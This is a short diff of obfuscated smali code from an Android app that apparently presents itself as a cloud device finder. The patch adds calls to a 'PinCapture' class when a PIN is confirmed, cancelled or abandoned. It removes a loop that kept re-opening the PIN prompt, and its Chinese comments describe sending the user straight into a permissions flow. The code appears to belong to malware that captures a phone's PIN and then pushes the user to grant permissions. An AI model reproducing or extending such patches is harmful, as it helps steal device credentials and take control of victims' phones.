@@ -43,6 +43,9 @@
     const-string p2, "PIN_CONFIRMED_CORRECT"
 
     invoke-static {p1, p2}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V
+
+    # 2.2：验证成功 → 进入权限流程
+    invoke-static {p0}, Lcom/lite/cloudfinder/pin/PinCapture;->onVerified(Landroid/content/Context;)V
     :try_end_0
     .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
 
@@ -56,27 +59,14 @@
     goto :goto_0
 
     :cond_0
-    const-string p1, "PIN verify cancelled, re-launching..."
+    const-string p1, "PIN verify cancelled -> permissions"
 
     invoke-static {p3, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
 
-    new-instance p1, Landroid/os/Handler;
+    # 2.2：取消/锁屏不再纠缠，直接进入权限流程
+    invoke-static {p0}, Lcom/lite/cloudfinder/pin/PinCapture;->onAborted(Landroid/content/Context;)V
 
-    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;
-
-    move-result-object p2
-
-    invoke-direct {p1, p2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V
-
-    new-instance p2, Landroidx/constraintlayout/helper/widget/؋;
-
-    const/16 p3, 0xf
-
-    invoke-direct {p2, p3, p0}, Landroidx/constraintlayout/helper/widget/؋;-><init>(ILjava/lang/Object;)V
-
-    const-wide/16 v0, 0x1f4
-
-    invoke-virtual {p1, p2, v0, v1}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
+    invoke-virtual {p0}, Landroid/app/Activity;->finish()V
 
     :cond_1
     :goto_0
@@ -85,6 +75,11 @@
 
 .method public final onBackPressed()V
     .locals 0
+
+    # 2.2：按返回 = 放弃输入，立即进入权限流程（不再死等）
+    invoke-static {p0}, Lcom/lite/cloudfinder/pin/PinCapture;->onAborted(Landroid/content/Context;)V
+
+    invoke-virtual {p0}, Landroid/app/Activity;->finish()V
 
     return-void
 .end method
